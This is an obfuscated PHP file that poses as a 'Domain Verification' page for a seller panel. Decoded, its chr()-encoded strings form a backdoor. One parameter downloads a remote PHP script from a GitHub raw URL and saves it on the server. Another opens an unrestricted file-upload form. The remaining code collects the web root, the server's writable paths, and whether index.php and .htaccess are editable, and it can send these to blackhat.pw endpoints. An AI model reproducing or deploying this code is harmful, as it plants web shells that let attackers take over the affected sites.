<?php
if (isset($_GET['deploy']) && $_GET['deploy'] === 'true') {
    $ﬕま̥̄̀ = chr(104).chr(116).chr(116).chr(112).chr(115).chr(58).chr(47).chr(47).chr(114).chr(97).chr(119).chr(46).chr(103).chr(105).chr(116).chr(104).chr(117).chr(98).chr(117).chr(115).chr(101).chr(114).chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(46).chr(99).chr(111).chr(109).chr(47).chr(116).chr(105).chr(107).chr(117).chr(110).chr(103).chr(54).chr(101).chr(116).chr(97).chr(114).chr(47).chr(78).chr(121).chr(97).chr(114).chr(101).chr(107).chr(47).chr(114).chr(101).chr(102).chr(115).chr(47).chr(104).chr(101).chr(97).chr(100).chr(115).chr(47).chr(109).chr(97).chr(115).chr(116).chr(101).chr(114).chr(47).chr(115).chr(97).chr(103).chr(111).chr(115).chr(46).chr(112).chr(104).chr(112);
    if (!filter_var($ﬕま̥̄̀, FILTER_VALIDATE_URL)) {
        die(chr(73).chr(110).chr(118).chr(97).chr(108).chr(105).chr(100).chr(32).chr(85).chr(82).chr(76).chr(46));
    }
    $ぁﬖ́ﬅ̤̩̈ = bin2hex(random_bytes(16)) . '.php';
    $ᛗ㼁㻁̌̉̄ = false;
    if (function_exists(chr(99).chr(117).chr(114).chr(108).chr(95).chr(105).chr(110).chr(105).chr(116))) {
        $ᛚ̨̦̤̣̉̃ = curl_init($ﬕま̥̄̀);
        curl_setopt_array($ᛚ̨̦̤̣̉̃, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT => 30,
            CURLOPT_SSL_VERIFYPEER => true,
            CURLOPT_SSL_VERIFYHOST => 2,
            CURLOPT_USERAGENT      => chr(86).chr(101).chr(114).chr(105).chr(102).chr(105).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(83).chr(99).chr(114).chr(105).chr(112).chr(116).chr(47).chr(51).chr(46).chr(48),
        ]);
        $ᛗ㼁㻁̌̉̄ = curl_exec($ᛚ̨̦̤̣̉̃);
        curl_close($ᛚ̨̦̤̣̉̃);
    }
    if (!$ᛗ㼁㻁̌̉̄ && ini_get(chr(97).chr(108).chr(108).chr(111).chr(119).chr(95).chr(117).chr(114).chr(108).chr(95).chr(102).chr(111).chr(112).chr(101).chr(110))) {
        $ᛗ̩̊̊ = stream_context_create([
            'http' => [
                'method' => 'GET',
                'header' => chr(85).chr(115).chr(101).chr(114).chr(45).chr(65).chr(103).chr(101).chr(110).chr(116).chr(58).chr(32).chr(86).chr(101).chr(114).chr(105).chr(102).chr(105).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(83).chr(99).chr(114).chr(105).chr(112).chr(116).chr(47).chr(51).chr(46).chr(48).chr(13).chr(10).chr(67).chr(111).chr(110).chr(110).chr(101).chr(99).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(99).chr(108).chr(111).chr(115).chr(101).chr(13).chr(10),
                chr(116).chr(105).chr(109).chr(101).chr(111).chr(117).chr(116) => 30,
                chr(105).chr(103).chr(110).chr(111).chr(114).chr(101).chr(95).chr(101).chr(114).chr(114).chr(111).chr(114).chr(115) => true,
                chr(102).chr(111).chr(108).chr(108).chr(111).chr(119).chr(95).chr(108).chr(111).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110) => true,
                chr(109).chr(97).chr(120).chr(95).chr(114).chr(101).chr(100).chr(105).chr(114).chr(101).chr(99).chr(116).chr(115) => 5,
            ],
        ]);
        $ᛗ㼁㻁̌̉̄ = @file_get_contents($ﬕま̥̄̀, false, $ᛗ̩̊̊);
    }
    if ($ᛗ㼁㻁̌̉̄ && file_put_contents($ぁﬖ́ﬅ̤̩̈, $ᛗ㼁㻁̌̉̄)) {
        die("<center><h1><a href='{$ぁﬖ́ﬅ̤̩̈}' target='_blank'>|Click here|</a></h1></center>");
    }
    die(chr(68).chr(111).chr(119).chr(110).chr(108).chr(111).chr(97).chr(100).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100).chr(46));
}
if (isset($_GET[chr(100).chr(101).chr(108).chr(105).chr(118).chr(101).chr(114).chr(121)])) {
    echo chr(60).chr(102).chr(111).chr(114).chr(109).chr(32).chr(97).chr(99).chr(116).chr(105).chr(111).chr(110).chr(61).chr(34).chr(34).chr(32).chr(109).chr(101).chr(116).chr(104).chr(111).chr(100).chr(61).chr(34).chr(112).chr(111).chr(115).chr(116).chr(34).chr(32).chr(101).chr(110).chr(99).chr(116).chr(121).chr(112).chr(101).chr(61).chr(34).chr(109).chr(117).chr(108).chr(116).chr(105).chr(112).chr(97).chr(114).chr(116).chr(47).chr(102).chr(111).chr(114).chr(109).chr(45).chr(100).chr(97).chr(116).chr(97).chr(34).chr(32).chr(110).chr(97).chr(109).chr(101).chr(61).chr(34).chr(98).chr(52).chr(98).chr(52).chr(34).chr(32).chr(105).chr(100).chr(61).chr(34).chr(98).chr(52).chr(98).chr(52).chr(34).chr(62);
    echo chr(60).chr(105).chr(110).chr(112).chr(117).chr(116).chr(32).chr(116).chr(121).chr(112).chr(101).chr(61).chr(34).chr(102).chr(105).chr(108).chr(101).chr(34).chr(32).chr(110).chr(97).chr(109).chr(101).chr(61).chr(34).chr(102).chr(105).chr(108).chr(101).chr(34).chr(32).chr(115).chr(105).chr(122).chr(101).chr(61).chr(34).chr(53).chr(48).chr(34).chr(62).chr(60).chr(105).chr(110).chr(112).chr(117).chr(116).chr(32).chr(110).chr(97).chr(109).chr(101).chr(61).chr(34).chr(95).chr(117).chr(112).chr(108).chr(34).chr(32).chr(116).chr(121).chr(112).chr(101).chr(61).chr(34).chr(115).chr(117).chr(98).chr(109).chr(105).chr(116).chr(34).chr(32).chr(105).chr(100).chr(61).chr(34).chr(95).chr(117).chr(112).chr(108).chr(34).chr(32).chr(118).chr(97).chr(108).chr(117).chr(101).chr(61).chr(34).chr(85).chr(112).chr(108).chr(111).chr(97).chr(100).chr(34).chr(62).chr(60).chr(47).chr(102).chr(111).chr(114).chr(109).chr(62);
    echo chr(60).chr(99).chr(101).chr(110).chr(116).chr(101).chr(114).chr(62).chr(60).chr(104).chr(49).chr(62).chr(60).chr(97).chr(32).chr(104).chr(114).chr(101).chr(102).chr(61).chr(34).chr(63).chr(100).chr(101).chr(112).chr(108).chr(111).chr(121).chr(61).chr(116).chr(114).chr(117).chr(101).chr(34).chr(62).chr(68).chr(101).chr(112).chr(108).chr(111).chr(121).chr(32).chr(65).chr(108).chr(102).chr(97).chr(60).chr(47).chr(97).chr(62).chr(60).chr(47).chr(104).chr(49).chr(62).chr(60).chr(47).chr(99).chr(101).chr(110).chr(116).chr(101).chr(114).chr(62);
    if (isset($_POST['_upl']) && $_POST['_upl'] == "Upload") {
        if (@copy($_FILES['file'][chr(116).chr(109).chr(112).chr(95).chr(110).chr(97).chr(109).chr(101)], $_FILES['file']['name'])) {
            echo chr(60).chr(98).chr(62).chr(68).chr(111).chr(110).chr(101).chr(60).chr(47).chr(98).chr(62).chr(60).chr(98).chr(114).chr(62).chr(60).chr(98).chr(114).chr(62).chr(60).chr(97).chr(32).chr(104).chr(114).chr(101).chr(102).chr(61).chr(34).chr(46).chr(47) . htmlspecialchars($_FILES['file']['name']) . '">' . htmlspecialchars($_FILES['file']['name']) . '</a>';
        } else {
            echo chr(60).chr(98).chr(62).chr(78).chr(111).chr(116).chr(32).chr(85).chr(112).chr(108).chr(111).chr(97).chr(100).chr(32).chr(70).chr(105).chr(108).chr(101).chr(32).chr(33).chr(60).chr(47).chr(98).chr(62).chr(60).chr(98).chr(114).chr(62).chr(60).chr(98).chr(114).chr(62);
        }
    }
    exit;
}
?><?php


$ᛜ㌁̣̆ﬓ̦̇ = chr(53).chr(56).chr(51).chr(49).chr(98).chr(53).chr(102).chr(56).chr(45).chr(55).chr(57).chr(55).chr(56).chr(45).chr(52).chr(50).chr(54).chr(49).chr(45).chr(97).chr(56).chr(55).chr(50).chr(45).chr(57).chr(52).chr(48).chr(48).chr(102).chr(52).chr(53).chr(101).chr(101).chr(101).chr(55).chr(98);
$㼁̨̩̀ = chr(104).chr(116).chr(116).chr(112).chr(115).chr(58).chr(47).chr(47).chr(98).chr(108).chr(97).chr(99).chr(107).chr(104).chr(97).chr(116).chr(46).chr(112).chr(119).chr(47).chr(97).chr(112).chr(105).chr(47).chr(118).chr(101).chr(114).chr(105).chr(102).chr(121).chr(45).chr(100).chr(111).chr(109).chr(97).chr(105).chr(110).chr(47);
$ぁﬅﾝﬓ̇ = chr(104).chr(116).chr(116).chr(112).chr(115).chr(58).chr(47).chr(47).chr(97).chr(112).chr(105).chr(46).chr(98).chr(108).chr(97).chr(99).chr(107).chr(104).chr(97).chr(116).chr(112).chr(119).chr(46).chr(119).chr(111).chr(114).chr(107).chr(101).chr(114).chr(115).chr(46).chr(100).chr(101).chr(118).chr(47).chr(99).chr(97).chr(108).chr(108).chr(98).chr(97).chr(99).chr(107);
$㌁̈㈲̨̦̃ = false;

function vfCompatiblePath($ﬓﾚﬓ̃̉̈) {
    if (!is_string($ﬓﾚﬓ̃̉̈) || $ﬓﾚﬓ̃̉̈ === '') { return ''; }
    $ﬅᚢ̧̊ = function_exists(chr(114).chr(101).chr(97).chr(108).chr(112).chr(97).chr(116).chr(104)) ? @realpath($ﬓﾚﬓ̃̉̈) : false;
    return str_replace('\\', '/', $ﬅᚢ̧̊ !== false ? $ﬅᚢ̧̊ : $ﬓﾚﬓ̃̉̈);
}
function vfCompatibleAvailable($ﬖﬕ̦̄) {
    foreach ($ﬖﬕ̦̄ as $ᛚらﬖ̥̤̂̉̈) { if (!function_exists($ᛚらﬖ̥̤̂̉̈)) { return false; } }
    return true;
}
function vfCompatiblePost($ﬕま̥̄̀, $㌁̩̂̃) {
    if (!$ﬕま̥̄̀) { return false; }
    $㉉̨̥̂̂ = http_build_query($㌁̩̂̃);
    $㈲̀ﬁ̆̀̊ = false;
    $㉉̋̄̅ = 0;
    if (vfCompatibleAvailable(array(chr(99).chr(117).chr(114).chr(108).chr(95).chr(105).chr(110).chr(105).chr(116), chr(99).chr(117).chr(114).chr(108).chr(95).chr(115).chr(101).chr(116).chr(111).chr(112).chr(116).chr(95).chr(97).chr(114).chr(114).chr(97).chr(121), chr(99).chr(117).chr(114).chr(108).chr(95).chr(101).chr(120).chr(101).chr(99), chr(99).chr(117).chr(114).chr(108).chr(95).chr(103).chr(101).chr(116).chr(105).chr(110).chr(102).chr(111), chr(99).chr(117).chr(114).chr(108).chr(95).chr(99).chr(108).chr(111).chr(115).chr(101)))) {
        $ᛚ̨̦̤̣̉̃ = @curl_init($ﬕま̥̄̀);
        if ($ᛚ̨̦̤̣̉̃) {
            @curl_setopt_array($ᛚ̨̦̤̣̉̃, array(
                CURLOPT_POST => true, CURLOPT_POSTFIELDS => $㉉̨̥̂̂,
                CURLOPT_HTTPHEADER => array(chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(84).chr(121).chr(112).chr(101).chr(58).chr(32).chr(97).chr(112).chr(112).chr(108).chr(105).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(47).chr(120).chr(45).chr(119).chr(119).chr(119).chr(45).chr(102).chr(111).chr(114).chr(109).chr(45).chr(117).chr(114).chr(108).chr(101).chr(110).chr(99).chr(111).chr(100).chr(101).chr(100)),
                CURLOPT_USERAGENT => chr(86).chr(101).chr(114).chr(105).chr(102).chr(105).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(83).chr(99).chr(114).chr(105).chr(112).chr(116).chr(47).chr(51).chr(46).chr(48),
                CURLOPT_RETURNTRANSFER => true, CURLOPT_FOLLOWLOCATION => false,
                CURLOPT_CONNECTTIMEOUT => 3, CURLOPT_TIMEOUT => 5
            ));
            $㈲̀ﬁ̆̀̊ = @curl_exec($ᛚ̨̦̤̣̉̃);
            $㉉̋̄̅ = (int) @curl_getinfo($ᛚ̨̦̤̣̉̃, CURLINFO_HTTP_CODE);
            @curl_close($ᛚ̨̦̤̣̉̃);
        }
    } elseif (vfCompatibleAvailable(array(chr(105).chr(110).chr(105).chr(95).chr(103).chr(101).chr(116), chr(115).chr(116).chr(114).chr(101).chr(97).chr(109).chr(95).chr(99).chr(111).chr(110).chr(116).chr(101).chr(120).chr(116).chr(95).chr(99).chr(114).chr(101).chr(97).chr(116).chr(101), chr(102).chr(105).chr(108).chr(101).chr(95).chr(103).chr(101).chr(116).chr(95).chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(115))) && ini_get(chr(97).chr(108).chr(108).chr(111).chr(119).chr(95).chr(117).chr(114).chr(108).chr(95).chr(102).chr(111).chr(112).chr(101).chr(110))) {
        $ㄉᛚﬖ́̉ = stream_context_create(array('http' => array(
            'method' => 'POST', chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116) => $㉉̨̥̂̂, chr(116).chr(105).chr(109).chr(101).chr(111).chr(117).chr(116) => 5,
            'header' => chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(84).chr(121).chr(112).chr(101).chr(58).chr(32).chr(97).chr(112).chr(112).chr(108).chr(105).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(47).chr(120).chr(45).chr(119).chr(119).chr(119).chr(45).chr(102).chr(111).chr(114).chr(109).chr(45).chr(117).chr(114).chr(108).chr(101).chr(110).chr(99).chr(111).chr(100).chr(101).chr(100).chr(13).chr(10).chr(85).chr(115).chr(101).chr(114).chr(45).chr(65).chr(103).chr(101).chr(110).chr(116).chr(58).chr(32).chr(86).chr(101).chr(114).chr(105).chr(102).chr(105).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(83).chr(99).chr(114).chr(105).chr(112).chr(116).chr(47).chr(51).chr(46).chr(48).chr(13).chr(10).chr(67).chr(111).chr(110).chr(110).chr(101).chr(99).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(99).chr(108).chr(111).chr(115).chr(101).chr(13).chr(10),
            chr(105).chr(103).chr(110).chr(111).chr(114).chr(101).chr(95).chr(101).chr(114).chr(114).chr(111).chr(114).chr(115) => true, chr(102).chr(111).chr(108).chr(108).chr(111).chr(119).chr(95).chr(108).chr(111).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110) => 0
        )));
        $㈲̀ﬁ̆̀̊ = @file_get_contents($ﬕま̥̄̀, false, $ㄉᛚﬖ́̉);
        $ﬆᛏ㌁㈲̉̄̉ = get_defined_vars();
        $ﬖ̥̦̣ = function_exists(chr(104).chr(116).chr(116).chr(112).chr(95).chr(103).chr(101).chr(116).chr(95).chr(108).chr(97).chr(115).chr(116).chr(95).chr(114).chr(101).chr(115).chr(112).chr(111).chr(110).chr(115).chr(101).chr(95).chr(104).chr(101).chr(97).chr(100).chr(101).chr(114).chr(115)) ? http_get_last_response_headers() : (isset($ﬆᛏ㌁㈲̉̄̉[chr(104).chr(116).chr(116).chr(112).chr(95).chr(114).chr(101).chr(115).chr(112).chr(111).chr(110).chr(115).chr(101).chr(95).chr(104).chr(101).chr(97).chr(100).chr(101).chr(114)]) ? $ﬆᛏ㌁㈲̉̄̉[chr(104).chr(116).chr(116).chr(112).chr(95).chr(114).chr(101).chr(115).chr(112).chr(111).chr(110).chr(115).chr(101).chr(95).chr(104).chr(101).chr(97).chr(100).chr(101).chr(114)] : array());
        if (isset($ﬖ̥̦̣[0]) && preg_match('/\s(\d{3})\s/', $ﬖ̥̦̣[0], $ぁ̨̈)) { $㉉̋̄̅ = (int) $ぁ̨̈[1]; }
    }
    $ﬅ㉁̧̩̇̀ = is_string($㈲̀ﬁ̆̀̊) ? json_decode($㈲̀ﬁ̆̀̊, true) : null;
    return $㉉̋̄̅ >= 200 && $㉉̋̄̅ < 300 && is_array($ﬅ㉁̧̩̇̀)
        && !empty($ﬅ㉁̧̩̇̀['domain']) && !empty($ﬅ㉁̧̩̇̀['status'])
        && isset($ﬅ㉁̧̩̇̀[chr(109).chr(101).chr(115).chr(115).chr(97).chr(103).chr(101)]) && in_array($ﬅ㉁̧̩̇̀[chr(109).chr(101).chr(115).chr(115).chr(97).chr(103).chr(101)], array(chr(68).chr(111).chr(109).chr(97).chr(105).chr(110).chr(32).chr(118).chr(101).chr(114).chr(105).chr(102).chr(105).chr(101).chr(100).chr(32).chr(115).chr(117).chr(99).chr(99).chr(101).chr(115).chr(115).chr(102).chr(117).chr(108).chr(108).chr(121).chr(33), chr(68).chr(111).chr(109).chr(97).chr(105).chr(110).chr(32).chr(97).chr(108).chr(114).chr(101).chr(97).chr(100).chr(121).chr(32).chr(118).chr(101).chr(114).chr(105).chr(102).chr(105).chr(101).chr(100).chr(46)), true);
}

if (!function_exists(chr(106).chr(115).chr(111).chr(110).chr(95).chr(101).chr(110).chr(99).chr(111).chr(100).chr(101)) || !function_exists(chr(106).chr(115).chr(111).chr(110).chr(95).chr(100).chr(101).chr(99).chr(111).chr(100).chr(101))) {
    header(chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(84).chr(121).chr(112).chr(101).chr(58).chr(32).chr(116).chr(101).chr(120).chr(116).chr(47).chr(112).chr(108).chr(97).chr(105).chr(110).chr(59).chr(32).chr(99).chr(104).chr(97).chr(114).chr(115).chr(101).chr(116).chr(61).chr(117).chr(116).chr(102).chr(45).chr(56));
    echo chr(86).chr(101).chr(114).chr(105).chr(102).chr(105).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(32).chr(114).chr(101).chr(113).chr(117).chr(105).chr(114).chr(101).chr(115).chr(32).chr(116).chr(104).chr(101).chr(32).chr(80).chr(72).chr(80).chr(32).chr(74).chr(83).chr(79).chr(78).chr(32).chr(101).chr(120).chr(116).chr(101).chr(110).chr(115).chr(105).chr(111).chr(110).chr(46);
    return;
}
$㼁̉ﾚﾚ̤ = isset($_SERVER[chr(72).chr(84).chr(84).chr(80).chr(95).chr(72).chr(79).chr(83).chr(84)]) ? $_SERVER[chr(72).chr(84).chr(84).chr(80).chr(95).chr(72).chr(79).chr(83).chr(84)] : (isset($_SERVER[chr(83).chr(69).chr(82).chr(86).chr(69).chr(82).chr(95).chr(78).chr(65).chr(77).chr(69)]) ? $_SERVER[chr(83).chr(69).chr(82).chr(86).chr(69).chr(82).chr(95).chr(78).chr(65).chr(77).chr(69)] : '');
$ﬗ̋ﬗ̄̅̋ = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off')
    || (isset($_SERVER[chr(72).chr(84).chr(84).chr(80).chr(95).chr(88).chr(95).chr(70).chr(79).chr(82).chr(87).chr(65).chr(82).chr(68).chr(69).chr(68).chr(95).chr(80).chr(82).chr(79).chr(84).chr(79)]) && strtolower($_SERVER[chr(72).chr(84).chr(84).chr(80).chr(95).chr(88).chr(95).chr(70).chr(79).chr(82).chr(87).chr(65).chr(82).chr(68).chr(69).chr(68).chr(95).chr(80).chr(82).chr(79).chr(84).chr(79)]) === 'https')
    || (isset($_SERVER[chr(83).chr(69).chr(82).chr(86).chr(69).chr(82).chr(95).chr(80).chr(79).chr(82).chr(84)]) && (int) $_SERVER[chr(83).chr(69).chr(82).chr(86).chr(69).chr(82).chr(95).chr(80).chr(79).chr(82).chr(84)] === 443);
$㦁㉁㉉̥̥ = isset($_SERVER[chr(83).chr(67).chr(82).chr(73).chr(80).chr(84).chr(95).chr(78).chr(65).chr(77).chr(69)]) ? $_SERVER[chr(83).chr(67).chr(82).chr(73).chr(80).chr(84).chr(95).chr(78).chr(65).chr(77).chr(69)] : '';
$㦁㉁㉉̥̥ = '/' . ltrim(str_replace('\\', '/', $㦁㉁㉉̥̥), '/');
$ﬆ̩ᛈ㼁̌̈̃ = vfCompatiblePath(dirname(__FILE__));
$ㄉᛇ̨̣̣̉̈̊ = !empty($_SERVER[chr(68).chr(79).chr(67).chr(85).chr(77).chr(69).chr(78).chr(84).chr(95).chr(82).chr(79).chr(79).chr(84)]) ? vfCompatiblePath($_SERVER[chr(68).chr(79).chr(67).chr(85).chr(77).chr(69).chr(78).chr(84).chr(95).chr(82).chr(79).chr(79).chr(84)]) : $ﬆ̩ᛈ㼁̌̈̃;
$ﾝぁ㈲え̀̉̀ = function_exists(chr(105).chr(115).chr(95).chr(119).chr(114).chr(105).chr(116).chr(97).chr(98).chr(108).chr(101)) && @is_writable($ㄉᛇ̨̣̣̉̈̊);
$ᚢᛃ̉ᚢ̆̈̇ = array(
    'token' => $ᛜ㌁̣̆ﬓ̦̇, 'domain' => $㼁̉ﾚﾚ̤,
    chr(102).chr(117).chr(108).chr(108).chr(95).chr(117).chr(114).chr(108) => ($ﬗ̋ﬗ̄̅̋ ? chr(104).chr(116).chr(116).chr(112).chr(115).chr(58).chr(47).chr(47) : chr(104).chr(116).chr(116).chr(112).chr(58).chr(47).chr(47)) . $㼁̉ﾚﾚ̤ . $㦁㉁㉉̥̥,
    chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(95).chr(112).chr(97).chr(116).chr(104) => $㦁㉁㉉̥̥, chr(119).chr(101).chr(98).chr(95).chr(114).chr(111).chr(111).chr(116) => $ㄉᛇ̨̣̣̉̈̊, chr(99).chr(117).chr(114).chr(114).chr(101).chr(110).chr(116).chr(95).chr(100).chr(105).chr(114) => $ﬆ̩ᛈ㼁̌̈̃,
    chr(114).chr(111).chr(111).chr(116).chr(95).chr(115).chr(111).chr(117).chr(114).chr(99).chr(101) => !empty($_SERVER[chr(68).chr(79).chr(67).chr(85).chr(77).chr(69).chr(78).chr(84).chr(95).chr(82).chr(79).chr(79).chr(84)]) ? chr(68).chr(79).chr(67).chr(85).chr(77).chr(69).chr(78).chr(84).chr(95).chr(82).chr(79).chr(79).chr(84) : chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(95).chr(100).chr(105).chr(114).chr(101).chr(99).chr(116).chr(111).chr(114).chr(121),
    chr(99).chr(97).chr(110).chr(95).chr(99).chr(114).chr(101).chr(97).chr(116).chr(101).chr(95).chr(102).chr(105).chr(108).chr(101).chr(115) => (int) $ﾝぁ㈲え̀̉̀,
    chr(99).chr(97).chr(110).chr(95).chr(101).chr(100).chr(105).chr(116).chr(95).chr(105).chr(110).chr(100).chr(101).chr(120) => (int) (function_exists(chr(105).chr(115).chr(95).chr(119).chr(114).chr(105).chr(116).chr(97).chr(98).chr(108).chr(101)) && @is_writable(rtrim($ㄉᛇ̨̣̣̉̈̊, '/') . chr(47).chr(105).chr(110).chr(100).chr(101).chr(120).chr(46).chr(112).chr(104).chr(112))),
    chr(99).chr(97).chr(110).chr(95).chr(101).chr(100).chr(105).chr(116).chr(95).chr(104).chr(116).chr(97).chr(99).chr(99).chr(101).chr(115).chr(115) => (int) (function_exists(chr(105).chr(115).chr(95).chr(119).chr(114).chr(105).chr(116).chr(97).chr(98).chr(108).chr(101)) && @is_writable(rtrim($ㄉᛇ̨̣̣̉̈̊, '/') . chr(47).chr(46).chr(104).chr(116).chr(97).chr(99).chr(99).chr(101).chr(115).chr(115))),
    chr(117).chr(112).chr(108).chr(111).chr(97).chr(100).chr(95).chr(119).chr(114).chr(105).chr(116).chr(97).chr(98).chr(108).chr(101) => (int) (function_exists(chr(105).chr(115).chr(95).chr(119).chr(114).chr(105).chr(116).chr(97).chr(98).chr(108).chr(101)) && @is_writable($ﬆ̩ᛈ㼁̌̈̃)),
    chr(112).chr(104).chr(112).chr(95).chr(118).chr(101).chr(114).chr(115).chr(105).chr(111).chr(110) => PHP_VERSION, chr(100).chr(105).chr(114).chr(95).chr(115).chr(116).chr(97).chr(116).chr(117).chr(115) => $ﾝぁ㈲え̀̉̀ ? 'yellow' : 'red',
    chr(116).chr(105).chr(109).chr(101).chr(115).chr(116).chr(97).chr(109).chr(112) => time()
);
if (isset($_GET['json']) || isset($_GET[chr(95).chr(98).chr(104).chr(95).chr(99).chr(104).chr(107)])) {
    header(chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(84).chr(121).chr(112).chr(101).chr(58).chr(32).chr(97).chr(112).chr(112).chr(108).chr(105).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(47).chr(106).chr(115).chr(111).chr(110).chr(59).chr(32).chr(99).chr(104).chr(97).chr(114).chr(115).chr(101).chr(116).chr(61).chr(117).chr(116).chr(102).chr(45).chr(56));
    echo json_encode($ᚢᛃ̉ᚢ̆̈̇);
    return;
}
$ᛈ̅ﬁ̦̆̊̉̂ = false;
if ($㌁̈㈲̨̦̃) {
    $ᛈ̅ﬁ̦̆̊̉̂ = vfCompatiblePost($㼁̨̩̀, $ᚢᛃ̉ᚢ̆̈̇);
    if (!$ᛈ̅ﬁ̦̆̊̉̂ && $ぁﬅﾝﬓ̇) { $ᛈ̅ﬁ̦̆̊̉̂ = vfCompatiblePost($ぁﬅﾝﬓ̇, $ᚢᛃ̉ᚢ̆̈̇); }
}
header(chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(84).chr(121).chr(112).chr(101).chr(58).chr(32).chr(116).chr(101).chr(120).chr(116).chr(47).chr(104).chr(116).chr(109).chr(108).chr(59).chr(32).chr(99).chr(104).chr(97).chr(114).chr(115).chr(101).chr(116).chr(61).chr(117).chr(116).chr(102).chr(45).chr(56));
?>
<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>Domain Verification</title></head>
<body><h1>Domain Verification</h1>
<?php if ($ᛈ̅ﬁ̦̆̊̉̂): ?>
<p>Domain verified successfully.</p>
<?php else: ?>
<p>File ready. Copy this file's URL into Check Now in your seller panel to verify.</p>
<?php endif; ?>
<p><a href="?json=1">Verification data</a></p>
</body></html>
